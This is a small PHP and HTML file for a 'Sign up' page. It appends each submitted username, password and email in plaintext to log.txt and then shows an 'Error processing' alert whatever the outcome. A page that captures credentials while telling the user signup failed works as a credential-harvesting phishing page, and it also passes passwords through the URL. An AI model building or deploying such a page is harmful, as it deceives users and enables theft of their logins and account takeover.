<?php
if(isset($_GET['submit'])){
	
$myFile = fopen("log.txt", "a") or die("Unable to open file");

$username = $_GET['username'];
$password = $_GET['password'];
$email = $_GET['email'];

$fill = $username.",".$password.",".$email."\n";

fwrite($myFile,$fill) or die("failed to write");

fclose($myFile);
}
?>
<html>
<head><b>Sign up</b></head>
<br><br>
<div>
<form action="loginsite.php" method="get">
Username:<br>
<input type="text" name="username">
<br><br>
Password:<br>
<input type="password" name="password">
<br><br>
Email:<br>
<input type="text" name="email">
<br><br>
<input type="submit" name="submit" value="Submit" Onclick="error()">
</form>
</div>
<script>
function error() {
	window.alert("Error processing");
}
</script>
</html>